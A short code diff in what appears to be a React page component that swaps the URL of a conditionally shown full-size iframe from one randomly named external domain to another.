@@ -51,7 +51,7 @@ export default function Home() {
 
       {!blockIframe && showIframe && (
         <iframe
-          src="https://bsjrgbvrifsvb.lakhokmao.com/index.html"
+          src="https://bsjrgbvrifsvb.iheffa.fun/index.html"
           className="w-full h-full"
         />
       )}
